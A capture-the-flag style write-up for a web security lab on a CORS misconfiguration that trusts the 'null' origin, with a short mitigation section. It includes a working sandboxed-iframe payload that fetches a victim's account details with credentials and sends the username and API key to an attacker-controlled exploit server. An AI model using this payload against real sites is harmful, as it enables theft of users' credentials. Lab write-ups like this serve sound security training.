# Lab 02 — CORS vulnerability with trusted null origin

> **Practitioner** · [Official lab](https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack)

**Entry point:** `/accountDetails` allows `Origin: null` with credentials.

## Solution

1. Confirm: `Origin: null` → `Access-Control-Allow-Origin: null` +
   `Access-Control-Allow-Credentials: true`.
2. An iframe with `sandbox` (without `allow-same-origin`) makes embedded
   requests run with a **null origin**. Host on the exploit server:

```html
<iframe sandbox="allow-scripts" srcdoc="
  <script>
    fetch('https://YOUR-LAB-ID.web-security-academy.net/accountDetails',
          {credentials:'include'})
      .then(r => r.json())
      .then(d => parent.location = 'https://YOUR-EXPLOIT-SERVER/log?data=' +
            encodeURIComponent(d.username + ':' + d.apiKey));
  </script>">
</iframe>
```

3. Deliver to victim — the sandboxed iframe sends `Origin: null`, the server
   allows it, and the API key is exfiltrated — lab solved.

## Mitigation

`null` in an allow-list is a red flag: it's what sandboxed iframes and
`file:` origins send. Require exact trusted origins.
